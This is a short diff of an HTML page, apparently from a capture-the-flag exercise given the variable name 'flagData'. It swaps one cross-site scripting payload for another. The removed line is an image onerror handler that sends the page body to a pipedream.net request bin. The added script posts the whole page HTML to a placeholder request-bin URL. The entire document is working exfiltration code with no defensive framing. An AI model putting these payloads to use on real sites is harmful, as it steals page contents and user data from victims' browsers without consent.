@@ -6,6 +6,21 @@
   <title>Hi</title>
 </head>
 <body>
-  <img src="q" onerror='fetch("https://eodec445wcgzbwx.m.pipedream.net?data=" + encodeURIComponent(document.body.innerHTML))'>
+  <script>
+    document.title = 'Payload executed';
+    var flagData = document.getElementsByTagName('html')[0].innerHTML;
+    
+    fetch('https://your-request-bin-url.com', {
+      method: 'POST',
+      body: JSON.stringify({ data: flagData }),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }).then(response => {
+      // Handle response if needed
+    }).catch(error => {
+      // Handle error if needed
+    });
+  </script>
 </body>
 </html>
